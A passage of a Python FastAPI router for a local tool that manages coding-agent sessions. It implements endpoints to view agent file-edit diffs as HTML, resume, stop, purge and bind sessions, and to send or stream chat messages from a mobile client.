        f'<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>'
        f'      </a>'
        f'    </span>'
        f'  </div>'
        f'  <div class="file-section-body">{body_html}</div>'
        f'</section>'
    )
    return file_html, {"net_add": net_add, "net_del": net_del, "mode": mode_label}


@router.get("/{sid}/changes/diff-view", response_class=None)
async def session_change_diff_view(
    sid: str, request: Request, path: str | None = None,
    full: bool = False,
):
    """All-in-one HTML diff view for a session's file changes.

    Two modes, chosen by the presence of the `path` query param:
      * `?path=X` — single-file view (backward compat, direct-link
        friendly). Sidebar has just that one file; main area has one
        section for it.
      * omitted — **all files** the session touched, stacked in one page
        with a left sidebar of file anchors. This is the primary
        entry-point the Changes button now targets — the previous
        popover-then-per-file-tab flow was duplicative (both surfaces
        were listing "what files changed").

    Rendering per file:
      * Whole-file cumulative diff when we can reconstruct the
        session-start snapshot (reverse-apply every edit to disk
        content). Diff `n` is the file length so context lines fill
        the space between change hunks — matches VS Code inline diff.
      * Per-edit fallback when reconstruction fails (Write / disk gone
        / a later edit rewrote a region unrecoverably).
      * Every code row runs through pygments per-language lexer, so
        Python / TS / Vue / YAML etc. get syntax colors on top of the
        row-level +/- tint.

    Response is a single-page HTML shell — sidebar + main pane, no JS
    needed to switch files (anchor scrolling). Bookmarkable per file
    via `#file-N` anchor.
    """
    from fastapi.responses import HTMLResponse

    from csm.api.files import (
        _dual_pygments_css,
        _html_escape,
        _shell,
        lookup_session_ctx,
    )
    from csm.modules.session_manager.changes import (
        filter_by_path,
        summarize_by_file,
    )

    _row, edits = await _load_edits_for_session(request, sid)
    # Build session_context for the "Back to session" bar. The diff-view
    # always knows its sid (URL-embedded), so this is unconditional —
    # unlike preview where session_id is optional. Missing row = fall
    # back to a synthetic {sid} context so the back button still works.
    sm = getattr(request.app.state, "sessionmaker", None)
    session_ctx: dict[str, Any] | None = None
    if sm is not None:
        row = await lookup_session_ctx(sm, sid)
        if row is not None:
            session_ctx = {**row, "mode": "diff"}
    if session_ctx is None:
        session_ctx = {"sid": sid, "title": None, "agent": None, "mode": "diff"}

    # Pygments per-language CSS (for the syntax spans embedded in each
    # code cell of the diff table). `pyghi-code` is the class our
    # per-line highlighter wraps spans in.
    diff_css = _dual_pygments_css("pyghi-code")

    if path is not None:
        matched = filter_by_path(edits, path)
        if not matched:
            body = (
                '<div class="diff-page single-mode">'
                '<div class="state-card state-info">'
                '<div class="state-title">No edits recorded</div>'
                '<div class="state-body">'
                "The agent didn't touch this file in this session, or its history "
                "was pruned before we could parse it."
                "</div></div></div>"
            )
            return HTMLResponse(_shell(path, Path(path).name or path, body, diff_css, "DIFF", session_context=session_ctx))
        file_groups = [(path, matched)]
        page_title = Path(path).name or path
    else:
        # All-files mode: group edits by file, ordered by last_ts desc so
        # most-recently-touched appears first in the sidebar.
        summaries = summarize_by_file(edits)
        if not summaries:
            body = (
                '<div class="diff-page">'
                '<div class="state-card state-info">'
                '<div class="state-title">No file edits in this session</div>'
                '<div class="state-body">'
                "The agent has no recorded file-edit operations "
                "in this session."
                "</div></div></div>"
            )
            return HTMLResponse(_shell("Session diff", "Session diff", body, diff_css, "DIFF", session_context=session_ctx))
        file_groups = [(s.path, filter_by_path(edits, s.path)) for s in summaries]
        page_title = f"{len(summaries)} files · {len(edits)} edits"

    # Render each file section + collect sidebar entries.
    # `n_context` = 6 by default (GitHub-compact); pass `?full=1` in the
    # URL to render whole-file context. This is the primary "less
    # scrolling" ergonomic — reviewers can flip once they've narrowed
    # down which file they care about.
    n_context = None if full else 6
    sidebar_items: list[str] = []
    sections: list[str] = []
    total_add = total_del = 0
    for i, (fp, file_edits) in enumerate(file_groups):
        anchor = f"file-{i + 1}"
        section_html, meta = _render_one_file_section(fp, file_edits, anchor, n_context=n_context)
        sections.append(section_html)
        total_add += meta["net_add"]
        total_del += meta["net_del"]
        from pathlib import Path as _P
        basename = _P(fp).name or fp
        dirname = str(_P(fp).parent) if fp else ""
        sidebar_items.append(
            f'<a href="#{anchor}" class="sidebar-item">'
            f'  <span class="side-name mono">{_html_escape(basename)}</span>'
            f'  <span class="side-dir mono">{_html_escape(dirname)}</span>'
            f'  <span class="side-counts mono">'
            f'    <span class="side-add">+{meta["net_add"]}</span>'
            f'    <span class="side-del">−{meta["net_del"]}</span>'
            f'  </span>'
            f'</a>'
        )

    # Context / full toggle link — flips the query param so users can
    # opt into whole-file context without leaving the page. Keyboard
    # helper strip also lives in the summary line so power users know j
    # / k / [ / ] exist without reading source.
    from urllib.parse import quote as urlquote
    toggle_href_base = f"/api/sessions/{urlquote(sid)}/changes/diff-view"
    if path is not None:
        toggle_href_base += f"?path={urlquote(path, safe='')}"
        toggle_full_href = toggle_href_base + ("" if full else "&full=1")
    else:
        toggle_full_href = toggle_href_base + ("" if full else "?full=1")
    toggle_label = "Compact context" if full else "Show full context"
    header_summary = (
        f'{len(file_groups)} file{"s" if len(file_groups) != 1 else ""} · '
        f'<span class="hdr-add">+{total_add}</span> '
        f'<span class="hdr-del">−{total_del}</span>'
        f'  <span class="hdr-hint">— <kbd>j</kbd>/<kbd>k</kbd> file · '
        f'<kbd>[</kbd>/<kbd>]</kbd> change · <kbd>c</kbd> collapse</span>'
        f'  <a class="hdr-toggle" href="{toggle_full_href}" '
        f'title="Toggle between compact hunks (±6 context) and whole-file context">'
        f'{toggle_label}</a>'
    )

    # Per-file collapse, sidebar scroll-spy, keyboard nav (j/k walk files ·
    # [/] walk +/- changes · c toggle current file). Plain vanilla: this page
    # must open from a bare URL with no SPA loaded, so there is no bundler.
    diff_js = f'\n{script_tag("diff.js")}\n'
    body = (
        '<div class="diff-page">'
        f'  <div class="diff-summary">{header_summary}</div>'
        '  <div class="diff-layout">'
        '    <aside class="diff-sidebar">'
        f'      <div class="sidebar-head">Changed files</div>'
        f'      <div class="sidebar-list">{"".join(sidebar_items)}</div>'
        '    </aside>'
        '    <main class="diff-main">'
        f'      {"".join(sections)}'
        '    </main>'
        '  </div>'
        f'{diff_js}'
        '</div>'
    )
    # Extra CSS for the diff page — extend the shell's base pygments
    # colors with card + header chrome so cards + tool tags render even
    # if the shell CSS drops something. Appends to (does not replace) the
    # pygments base above — diff.css overrides .gd/.gi/.gu/.gh with
    # display:block + tinted backgrounds, so changed lines read as highlighted
    # rows rather than colored text runs.
    # Leading "\n" is load-bearing: this appends to the pygments block above,
    # and without a separator the two would run together on one line.
    diff_css += "\n" + asset("diff.css")
    # Shell needs a "path" for the copy-path button / download URL; use the
    # single file's path when in single-mode, else a synthetic session ident
    # so the shell chrome still renders coherently.
    shell_path = path if path is not None else f"session-{sid[:8]}-changes"
    return HTMLResponse(_shell(shell_path, page_title, body, diff_css, "DIFF", session_context=session_ctx))


@router.get("/{sid}/changes/diff")
async def session_change_diff(
    sid: str, path: str, request: Request,
) -> dict[str, Any]:
    """All agent edits to `path` in this session, in chronological order.

    Response shape:
        {
          "sid": "<sid>",
          "path": "/abs/path.py",
          "edits": [
            {"index": 0, "ts": "...", "tool": "Edit",
             "old": "...", "new": "...", "tool_use_id": "toolu_..."},
            ...
          ]
        }

    The frontend renders each edit as a mini diff. ``old`` is null when
    the transcript has no baseline (Claude Write and Codex move/delete
    metadata records).

    404 if the session row is missing; 200 with empty `edits` if the
    session has no edits for that path (safer than 404, since a caller
    might poll and races with a claude turn that hasn't landed yet).
    """
    from csm.modules.session_manager.changes import filter_by_path

    row, edits = await _load_edits_for_session(request, sid)
    matched = filter_by_path(edits, path)
    return {
        "sid": row.id,
        "path": path,
        "edits": [
            {
                "index": i,
                "ts": r.ts,
                "tool": r.tool,
                "old": r.old,
                "new": r.new,
                "tool_use_id": r.tool_use_id,
                "sub_index": r.sub_index,
                "source_path": r.source_path,
            }
            for i, r in enumerate(matched)
        ],
    }


class BindBody(BaseModel):
    # Accept both names for one release. `external_session_id` is the
    # canonical multi-agent name; `claude_session_id` is the deprecated
    # claude-era alias.
    external_session_id: str | None = None
    claude_session_id: str | None = None


class PatchBody(BaseModel):
    title: str | None = None
    # local:a79c795d — move a session between SessionProjects (or back to
    # the auto cwd bucket by sending ""/null). Empty string = unset.
    session_project_id: str | None = None
    # local:45b259b4 — right-click menu additions.
    pinned: bool | None = None
    manual_unread: bool | None = None
    highlighted: bool | None = None
    archived: bool | None = None


@router.patch("/{sid}")
async def patch_session(sid: str, body: PatchBody, request: Request):
    """Update mutable fields on a session (currently: title)."""
    mgr = _mgr(request)
    row = await mgr.get_session(sid)
    if row is None:
        raise HTTPException(status_code=404, detail="session not found")
    from csm.models.session import Session
    sm = request.app.state.sessionmaker
    async with sm() as db:
        sess = await db.get(Session, sid)
        if sess is None:
            raise HTTPException(status_code=404)
        if body.title is not None:
            stripped = body.title.strip() or None
            sess.title = stripped
            # `local:7a422f9d` — a UI rename claims ownership of the
            # title so adapters (claude custom-title tail, codex
            # threads.title poll) stop overwriting it. Clearing to null
            # releases the claim so external sources can take over
            # again on the next tick.
            sess.title_manual = stripped is not None
        if body.session_project_id is not None:
            # Empty string is a client-friendly "unset" marker.
            sess.session_project_id = body.session_project_id.strip() or None
        if body.pinned is not None:
            sess.pinned = bool(body.pinned)
        if body.manual_unread is not None:
            sess.manual_unread = bool(body.manual_unread)
        if body.highlighted is not None:
            sess.highlighted = bool(body.highlighted)
        if body.archived is not None:
            from csm.utils.time import now_utc_naive
            sess.archived_at = now_utc_naive() if body.archived else None
        await db.commit()
        await db.refresh(sess)
    return _serialize(sess)


@router.get("/{sid}/output")
async def session_output(sid: str, request: Request) -> Response:
    """Latest replayable PTY tail for live or ended-session review."""
    mgr = _mgr(request)
    row = await mgr.get_session(sid)
    if row is None:
        raise HTTPException(status_code=404, detail="session not found")
    data, source = await mgr.output_snapshot(sid)
    return Response(
        content=data,
        media_type="application/octet-stream",
        headers={
            "X-CSM-Output-Source": source,
            "X-CSM-Output-Bytes": str(len(data)),
            "Cache-Control": "no-store",
        },
    )


@router.post("/{sid}/resume")
async def resume_session(sid: str, request: Request):
    """Reopen an exited/crashed interactive agent conversation in a new PTY.

    The adapter translates `external_session_id` to its native resume form
    (`claude --resume …` or `codex resume …`). Only allowed when the source
    row is interactive and no longer running.

    Post-conditions we now enforce:
    - **exactly one** CSM row keeps the shared `claude_session_id` — the old
      row is nulled so EventStream / notification_bus's
      `where(claude_session_id == …).scalar_one_or_none()` unambiguously
      resolves to the fresh row (P0 #2).
    - if the old row is ORPHANED and its pid is still alive, we SIGKILL it
      before spawning so the new and old PTYs don't both write to the same
      JSONL (P0 #3).
    - `create_session` failures (bad cwd, PtyProcess.spawn OSError) map to
      typed HTTP responses instead of a bare 500 (P1 #9 / #11).
    - concurrent double-clicks are serialised via a per-sid lock — the
      second caller sees the row already promoted to a fresh session and
      gets 409 instead of spawning a duplicate (P0 #4 backend guard).
    """
    mgr = _mgr(request)
    old = await mgr.get_session(sid)
    if old is None:
        raise HTTPException(status_code=404, detail="session not found")
    if old.type != SessionType.INTERACTIVE:
        raise HTTPException(status_code=400, detail="only interactive sessions can be resumed")
    # ORPHANED is deliberately EXCLUDED from the allow-list. Root cause of the
    # "sessions dying with exit_code=-9" cascade: an orphan pid can be either
    # (a) a CSM-forked claude whose master fd was lost across a backend restart
    # — genuinely useless — OR (b) the same claude the user is actively driving
    # from a real terminal (e.g. tmux) that happens to also be tailed by CSM.
    # CSM has no way to tell (a) from (b), and the pre-fix Resume path blindly
    # SIGKILLed the orphan pid before spawning a fresh PTY → we routinely
    # nuked the user's live conversation. The safe operation is manual: user
    # runs `kill <pid>` in their shell if they want to reclaim, then Resume
    # from the resulting CRASHED/EXITED row (pid=dead → no ambiguity).
    if old.status not in (SessionStatus.EXITED, SessionStatus.CRASHED):
        raise HTTPException(
            status_code=409,
            detail=(
                f"cannot resume a session in status={old.status.value}. "
                "For orphaned sessions: CSM no longer owns the process; "
                "kill it manually via `kill <pid>` in your shell (pid is "
                "visible in the session card), then resume the resulting row."
                if old.status == SessionStatus.ORPHANED
                else f"cannot resume a session in status={old.status.value}"
            ),
        )
    from csm.backends import build_default_registry
    from csm.backends.base import Capability
    registry = getattr(request.app.state, "adapter_registry", None)
    if registry is None:
        # Lightweight endpoint tests and embedded callers may omit lifespan
        # wiring. Use the same canonical built-in registry as production.
        registry = build_default_registry()
    try:
        adapter = registry.get(old.agent)
    except Exception:
        adapter = None
    if adapter is None or Capability.RESUME_SESSION not in adapter.capabilities:
        raise HTTPException(
            status_code=422,
            detail=f"agent {old.agent!r} does not support session resume",
        )
    if old.superseded_by:
        raise HTTPException(
            status_code=409,
            detail=f"this session was already resumed into {old.superseded_by[:8]}… — resume that row instead",
        )
    if not Path(old.cwd).is_dir():
        raise HTTPException(
            status_code=410,  # gone — the working directory backing this history entry no longer exists
            detail=f"original cwd no longer exists: {old.cwd}",
        )
    # Adapter-specific artifact preflight. Fail before spawning instead of
    # producing a fast-crashing zombie row when the CLI already pruned its
    # conversation history.
    resume_external_id = old.external_session_id
    recovered_rollout: Path | None = None
    if old.agent == "claude":
        if not resume_external_id:
            raise HTTPException(
                status_code=422,
                detail=(
                    "session has no external_session_id — nothing to resume "
                    "(this row predates durable Claude session binding)"
                ),
            )
        if not _jsonl_present(old.cwd, resume_external_id):
            raise HTTPException(
                status_code=410,
                detail=(
                    "Claude has removed this session's JSONL history, so it "
                    "can no longer be resumed. Archive or permanently delete "
                    "the history row, or start a new session."
                ),
            )
    elif old.agent == "codex":
        from csm.modules.session_manager.changes import (
            codex_rollout_session_id,
            find_codex_rollout,
        )
        rollout = None
        if old.rollout_path:
            candidate = Path(old.rollout_path)
            try:
                rollout = candidate if candidate.is_file() else None
            except OSError:
                rollout = None
        if rollout is None:
            rollout = await asyncio.to_thread(
                find_codex_rollout,
                settings.codex_sessions_dir,
                external_session_id=resume_external_id,
                cwd=old.cwd,
                started_at=old.started_at,
            )
        if rollout is None:
            raise HTTPException(
                status_code=410,
                detail=(
                    "Codex rollout history is no longer available, so this "
                    "session cannot be resumed."
                ),
            )
        recovered_rollout = rollout
        if not resume_external_id:
            resume_external_id = await asyncio.to_thread(
                codex_rollout_session_id, rollout,
            )
        if not resume_external_id:
            raise HTTPException(
                status_code=410,
                detail="Codex rollout exists but has no recoverable session id.",
            )

        # Heal legacy rows before entering the double-click lock so its
        # re-fetch sees the recovered durable identity too.
        if not old.external_session_id or not old.rollout_path:
            sm = request.app.state.sessionmaker
            async with sm() as db:
                legacy = await db.get(SessionModel, sid)
                if legacy is not None:
                    legacy.external_session_id = resume_external_id
                    legacy.rollout_path = str(recovered_rollout)
                    await db.commit()

    lock = mgr._resume_locks.setdefault(sid, asyncio.Lock())
    try:
        async with lock:
            # Re-fetch inside the lock: another /resume that won the race would
            # have set `superseded_by`, in which case there's nothing left to
            # resume from this row (the fresh chain-tail is elsewhere).
            fresh_old = await mgr.get_session(sid)
            if fresh_old is None or not fresh_old.external_session_id or fresh_old.superseded_by:
                raise HTTPException(status_code=409, detail="session already resumed by a concurrent request")
            external_sid_to_resume = fresh_old.external_session_id

            # Old row is guaranteed EXITED or CRASHED at this point (see the
            # allow-list at line 361), so its pid is either None or dead. We
            # deliberately do NOT touch the pid here — the pre-fix path did an
            # `os.kill(fresh_old.pid, SIGKILL)` for the ORPHANED branch and
            # that footgun killed the user's live conversation whenever the
            # orphan pid was still driven from another terminal. See the
            # comment on the status guard for the full incident.
            try:
                new_row = await mgr.create_session(
                    cwd=fresh_old.cwd,
                    type=SessionType.INTERACTIVE,
                    title=fresh_old.title,
                    resume_from=external_sid_to_resume,
                    agent=fresh_old.agent,
                )
            except ClaudeSessionIdConflict as e:
                raise HTTPException(
                    status_code=409,
                    detail=f"external_session_id {e.external_session_id} is already claimed by a live session; end it first",
                )
            except FileNotFoundError as e:
                raise HTTPException(status_code=410, detail=f"cwd or argv[0] not found: {e}")
            except PermissionError as e:
                raise HTTPException(status_code=403, detail=f"permission denied spawning session: {e}")
            except OSError as e:
                raise HTTPException(status_code=500, detail=f"spawn failed: {e}")

            # Success — mark the old row `superseded_by = new_row.id`. Keep
            # `claude_session_id` intact so we can still find the JSONL if
            # the user ever needs to resume that predecessor manually;
            # EventStream / notification lookups by claude_session_id filter
            # `superseded_by IS NULL` so ambiguity is resolved. `resumed-into`
            # tag stays for backward-compat / provenance.
            sm = request.app.state.sessionmaker
            async with sm() as db:
                o = await db.get(SessionModel, sid)
                if o is not None:
                    o.superseded_by = new_row.id
                    current_tags = list(o.tags or [])
                    current_tags.append(f"resumed-into:{new_row.id}")
                    o.tags = current_tags
                    await db.commit()

        return _serialize(new_row)
    finally:
        # Clear the per-sid entry so this dict does not accumulate O(N) locks
        # on a long-running process. Concurrent /resume of the same sid remains
        # correctly serialised: a second caller only reaches this pop after
        # the first has already exited `async with lock`.
        mgr._resume_locks.pop(sid, None)


@router.post("/{sid}/bind")
async def bind_session(sid: str, body: BindBody, request: Request):
    """Bind a PTY session to its on-disk JSONL session uuid (B5 fix).

    The reconciler in v1 doesn't auto-bind interactive PTY sessions to their
    underlying JSONL file; this endpoint lets a UI / script set the link
    manually so notifications + events flow correctly.
    """
    mgr = _mgr(request)
    row = await mgr.get_session(sid)
    if row is None:
        raise HTTPException(status_code=404, detail="session not found")
    from csm.models import Session
    sm = request.app.state.sessionmaker
    async with sm() as db:
        sess = await db.get(Session, sid)
        if sess is None:
            raise HTTPException(status_code=404, detail="session not found")
        # Prefer new name; fall back to deprecated alias.
        new_id = body.external_session_id or body.claude_session_id
        if not new_id:
            raise HTTPException(
                status_code=400,
                detail="body must include `external_session_id` (or legacy `claude_session_id`)",
            )
        sess.external_session_id = new_id
        await db.commit()
        await db.refresh(sess)
    return _serialize(sess)


@router.delete("/{sid}")
async def stop_session(
    sid: str,
    request: Request,
    graceful: bool = True,
    async_: bool = False,
):
    """Stop a session.

    - `async_=false` (default): block until the signal ladder finishes (up to 15s);
      return the final exit_code synchronously.
    - `async_=true` (B3 fix): fire the ladder in a BackgroundTask and immediately
      return 202 `{"accepted": sid}` so the HTTP client doesn't have to wait.
    """
    mgr = _mgr(request)
    if async_:
        from starlette.background import BackgroundTask
        from starlette.responses import JSONResponse

        async def _runner() -> None:
            try:
                await mgr.stop_session(sid, graceful=graceful)
            except Exception:
                pass

        return JSONResponse(
            {"accepted": sid},
            status_code=202,
            background=BackgroundTask(_runner),
        )
    code = await mgr.stop_session(sid, graceful=graceful)
    return {"exit_code": code}


@router.post("/{sid}/kill")
async def kill_session_post(sid: str, request: Request):
    mgr = _mgr(request)
    code = await mgr.kill_session(sid)
    return {"exit_code": code}


@router.post("/purge-history")
async def purge_history_sessions(request: Request) -> dict[str, Any]:
    """Bulk-purge every interactive session in EXITED / CRASHED status.

    Mirrors what the frontend's "history" bucket shows (interactive +
    exited/crashed — see Sessions.vue bucketOf()). Never touches AUTO
    rows (those live in the Automation module) and never touches live
    sessions. Idempotent; returns the count and the ids that were
    purged. Reuses the same cleanup steps as per-sid purge: cascade
    Run.session_id -> NULL, delete notifications, null out any
    `superseded_by` back-pointers, drop the rows, evict from the bus
    dedup state, unlink output files.
    """
    from sqlalchemy import delete as sa_delete
    from sqlalchemy import select as sa_select
    from sqlalchemy import update as sa_update

    from csm.models import Notification, Run
    from csm.models import Session as SessionModel

    mgr = _mgr(request)
    sm = request.app.state.sessionmaker
    async with sm() as db:
        res = await db.execute(
            sa_select(SessionModel.id).where(
                SessionModel.type == SessionType.INTERACTIVE,
                SessionModel.status.in_((SessionStatus.EXITED, SessionStatus.CRASHED)),
            )
        )
        ids = [row for row in res.scalars().all()]
        if not ids:
            return {"purged": 0, "ids": []}
        await db.execute(sa_update(Run).where(Run.session_id.in_(ids)).values(session_id=None))
        await db.execute(sa_delete(Notification).where(Notification.session_id.in_(ids)))
        await db.execute(
            sa_update(SessionModel)
            .where(SessionModel.superseded_by.in_(ids))
            .values(superseded_by=None)
        )
        await db.execute(sa_delete(SessionModel).where(SessionModel.id.in_(ids)))
        await db.commit()

    bus = getattr(request.app.state, "notification_bus", None)
    for sid in ids:
        if bus is not None:
            try:
                bus.evict_session(sid)
            except Exception:
                pass
        try:
            output_path = mgr._output_path(sid)
            await asyncio.to_thread(output_path.unlink, missing_ok=True)
        except Exception:
            pass
    return {"purged": len(ids), "ids": ids}


@router.post("/{sid}/purge")
async def purge_session(sid: str, request: Request):
    """Permanently delete a closed row and its notifications.

    Stopping and deleting are intentionally separate operations. A purge
    request never kills a live process as a side effect.
    """
    mgr = _mgr(request)
    row = await mgr.get_session(sid)
    if row is None:
        raise HTTPException(status_code=404, detail="session not found")
    if row.status not in (SessionStatus.EXITED, SessionStatus.CRASHED):
        raise HTTPException(
            status_code=409,
            detail="session is still live; stop it before permanently deleting it",
        )
    from sqlalchemy import delete as sa_delete
    from sqlalchemy import update as sa_update

    from csm.models import Notification, Run
    from csm.models import Session as SessionModel
    sm = request.app.state.sessionmaker
    async with sm() as db:
        await db.execute(sa_update(Run).where(Run.session_id == sid).values(session_id=None))
        await db.execute(sa_delete(Notification).where(Notification.session_id == sid))
        # Cascade-null: any predecessor that pointed at this row via
        # `superseded_by` becomes a dangling pointer once we delete this
        # row. Zero it out so the predecessor re-appears as a resumable
        # history entry instead of a mysteriously grayed-out row.
        await db.execute(
            sa_update(SessionModel)
            .where(SessionModel.superseded_by == sid)
            .values(superseded_by=None)
        )
        await db.execute(sa_delete(SessionModel).where(SessionModel.id == sid))
        await db.commit()
    # Evict any in-memory dedup state so a session id reused later (or
    # simply the residual `_last_new_msg` pointer) can't silently swallow
    # future NEW_MESSAGE events. Non-fatal if the bus isn't wired up
    # (some test harnesses skip it).
    bus = getattr(request.app.state, "notification_bus", None)
    if bus is not None:
        try:
            bus.evict_session(sid)
        except Exception:
            pass
    try:
        output_path = mgr._output_path(sid)
        await asyncio.to_thread(output_path.unlink, missing_ok=True)
    except Exception:
        pass
    return {"purged": sid}


@router.websocket("/{sid}/ws")
async def attach(websocket: WebSocket, sid: str):
    _require_access_ws(websocket)
    mgr: SessionManager = websocket.app.state.session_manager
    await mgr.attach_websocket(sid, websocket)


# ---- Mobile chat: send a line to stdin + tail structured messages by sid ----
# These turn a regular interactive claude session into a chat surface for the
# mobile client (which has no xterm). They reuse the exact AgentChat machinery
# (JsonlFastTail + message_router + PTY write) but key off the session id
# directly instead of a conversation id. Additive; desktop is unaffected.


class _SessionMessageBody(BaseModel):
    text: str = Field(..., min_length=1)
    # Optional client-generated idempotency key. Lets the mobile client safely
    # RETRY a send whose HTTP response was lost on a flaky SSH tunnel: the retry
    # carries the same id, so the backend skips the second PTY write instead of
    # double-typing the prompt into claude.
    client_msg_id: str | None = None
    # When true, `text` is written to the PTY VERBATIM — no trailing-newline
    # strip, no CRLF append, no control-char special-casing. Used by the mobile
    # interactive-choice panel to send raw key sequences (digits, ESC[B down
    # arrow, bare \r) that drive claude's in-terminal pickers (AskUserQuestion /
    # plan approval). A CRLF appended to an arrow-key escape would corrupt it.
    raw: bool = False


# Bounded in-memory dedup of (session_id, client_msg_id). In-memory is enough:
# it only needs to cover the brief retry window; losing it on restart merely
# degrades to at-least-once (the current behavior).
_SEND_DEDUP: OrderedDict[tuple[str, str], None] = OrderedDict()
_SEND_DEDUP_MAX = 1024

# Per-session send lock. The dedup check → write → remember sequence straddles an
# `await write_input`, so without this two concurrent POSTs carrying the SAME
# client_msg_id (a tunnel retry racing a slow-but-not-lost original) both pass
# _send_already_seen before either records → DOUBLE write into the PTY. Serialise
# per session (the PTY is sequential anyway). setdefault is atomic under asyncio's
# single thread; no await between get-or-create and acquire.
_SEND_LOCKS: dict[str, asyncio.Lock] = {}


def _send_lock_for(sid: str) -> asyncio.Lock:
    return _SEND_LOCKS.setdefault(sid, asyncio.Lock())


def _send_already_seen(sid: str, mid: str) -> bool:
    key = (sid, mid)
    if key in _SEND_DEDUP:
        _SEND_DEDUP.move_to_end(key)
        return True
    return False


def _send_remember(sid: str, mid: str) -> None:
    _SEND_DEDUP[(sid, mid)] = None
    while len(_SEND_DEDUP) > _SEND_DEDUP_MAX:
        _SEND_DEDUP.popitem(last=False)




@router.post("/{sid}/message")
async def send_session_message(
    sid: str, body: _SessionMessageBody, request: Request
):
    """Write a line of user text to a live session's PTY stdin.

    Mirrors POST /api/agents/conversations/{cid}/messages but keyed by session
    id. CRLF is load-bearing: the TTY driver needs the \\r to submit the prompt.
    Idempotent when the client supplies `client_msg_id` (safe tunnel retries).
    """
    mgr: SessionManager = request.app.state.session_manager
    row = await mgr.get_session(sid)
    if row is None:
        raise HTTPException(status_code=404, detail="session not found")
    chunks: list[bytes]
    if body.raw:
        # Verbatim key sequence (interactive-picker driving) — no framing.
        chunks = [body.text.encode("utf-8", errors="replace")]
    else:
        text = body.text.rstrip("\n")
        # CRLF is load-bearing for prose (the TTY driver needs \r to submit the
        # prompt), but a bare control byte — e.g. Ctrl-C (\x03) from the
        # interrupt button — must reach the PTY as-is. Appending CRLF to \x03
        # sends 0x03 0x0d 0x0a, which submits a stray blank line to the REPL
        # right after the SIGINT. So skip the CRLF when the payload is entirely
        # C0 control chars.
        if text and all(ord(c) < 0x20 for c in text):
            chunks = [text.encode("utf-8", errors="replace")]
        else:
            # Prose framing is per-CLI, NOT a universal `text + CRLF`: codex's
            # TUI silently drops a burst carrying text and Enter together, and
            # claude reads a long burst as a paste and never acts on the
            # trailing CR. Both need more than one write's worth of shape, so
            # ask the adapter for the whole sequence rather than assuming.
            chunks = mgr.frame_prose_sequence(row.agent, text)
    # Hold the per-session lock across dedup-check → write → remember so a
    # concurrent retry with the same client_msg_id can't slip past the check
    # while the first write is in flight and double-type into the PTY.
    async with _send_lock_for(sid):
        # Dedup a retried send BEFORE writing — the first attempt may have
        # written successfully and only lost its response on the tunnel.
        if body.client_msg_id and _send_already_seen(sid, body.client_msg_id):
            return {"sent": sid, "deduped": True}
        written, total = await mgr.write_input_sequence(sid, chunks)
        if written <= 0:
            raise HTTPException(status_code=409, detail="session not live")
        if written < total:
            # The PTY buffer filled and the CLI didn't drain it before
            # PtyHandle.write's 5s deadline. This used to return 200: the
            # submit CR sits at the END of the payload, so a truncated write
            # always loses it, and the phone reported "sent" for a message that
            # provably never submitted. Deliberately NOT remembering the
            # idempotency key — the send didn't complete, so a retry has to be
            # allowed through rather than being deduped into silence.
            raise HTTPException(
                status_code=503,
                detail=(
                    f"PTY accepted only {written}/{total} bytes — the agent is "
                    "not reading its input. Message not submitted; the "
                    "composer may hold a partial line."
                ),
            )
        # Record only AFTER a fully successful write, so a 409 (not live) and a
        # 503 (short write) both stay retryable.
        if body.client_msg_id:
            _send_remember(sid, body.client_msg_id)
    return {"sent": sid}


async def _transcript_path_for(row) -> Path | None:
    """Resolve a session's transcript file, whichever CLI produced it.

    Claude writes one JSONL per conversation under `claude_projects_dir`;
    codex writes a `rollout-*.jsonl` under `codex_sessions_dir`, whose path is
    recorded on the row at post-spawn-bind time (falling back to a scan when
    the column is empty or stale). Everything downstream of this function is
    agent-agnostic: `route_record()` normalises both shapes into the same chat
    envelope. Mirrors the resolution `_load_edits_for_session` already uses.

    Returns None when the transcript isn't on disk yet — the caller should
    treat that as retryable, not terminal.
    """
    from csm.modules.session_manager.changes import find_codex_rollout

    agent = (getattr(row, "agent", "claude") or "claude")
    if agent == "codex":
        if row.rollout_path:
            candidate = Path(row.rollout_path)
            try:
                if candidate.is_file():
                    return candidate
            except OSError:
                pass
        return await asyncio.to_thread(
            find_codex_rollout,
            settings.codex_sessions_dir,
            external_session_id=row.external_session_id,
            cwd=row.cwd,
            started_at=row.started_at,
        )
    if not row.external_session_id:
        return None
    try:
        return conversation_jsonl_path(
            settings.claude_projects_dir, row.cwd, row.external_session_id
        )
    except Exception:
        return None


# Agents whose transcript `route_record()` knows how to normalise into chat
# events. Anything else has no chat surface — the client should fall back to
# the terminal view rather than sit on a socket that will never emit.
_CHATTABLE_AGENTS = ("claude", "codex")

# Longest snippet kept per rail node. Enough for the tap preview; the client
# never renders more than one line of it.
_NODE_TEXT_CHARS = 90
# Ceiling on rail nodes shipped. A transcript with more human turns than this
# would make a rail of unclickable dots anyway, so the newest are the useful
# ones. Bounds the frame at roughly 200KB worst case.
_NODE_INDEX_MAX = 2000


def _user_message_index(events: list[dict[str, Any]]) -> list[dict[str, Any]]:
    """Index of every human-typed message across the WHOLE transcript.

    Feeds the mobile jump rail. `i` indexes the same `events` array the
    history frame's `offset` addresses, so the client can tell which nodes
    are already loaded and page back to reach the rest.

    Machine-filed role-"user" records are dropped here (they are never
    something the human said, so no surface wants them); slash commands stay
    in and are filtered client-side, where that rule already lives.
    """
    out = [
        {"i": i, "text": (e.get("text") or "")[:_NODE_TEXT_CHARS], "ts": e.get("ts")}
        for i, e in enumerate(events)
        if e.get("type") == "user_message" and not e.get("injected")
    ]
    return out[-_NODE_INDEX_MAX:]


@router.websocket("/{sid}/messages")
async def session_message_stream(ws: WebSocket, sid: str):
    """Structured chat message stream for a session.

    Tails the session's own transcript and emits the same envelope as the
    agent conversation WS (session_status / history / per-line events).
    Read-only: sending goes through POST /api/sessions/{sid}/message.

    Works for claude and codex alike — `route_record()` dispatches on record
    shape and returns one schema for both, so only the file lookup differs
    (see `_transcript_path_for`). Codex chat is narrower than claude's: its
    rollout surfaces user messages and each turn's final reply, but no
    tool-call progress (see `_route_codex_record`).
    """
    _require_access_ws(ws)
    await ws.accept()
    mgr: SessionManager = ws.app.state.session_manager
    row = await mgr.get_session(sid)
    if row is None:
        await ws.send_json({"type": "error", "detail": "session not found"})
        await ws.close(code=4404)
        return
    agent = (row.agent or "claude")
    if agent not in _CHATTABLE_AGENTS:
        await ws.send_json(
            {"type": "error", "detail": f"chat not supported for agent {agent!r}"}
        )
        await ws.close(code=4500)
        return
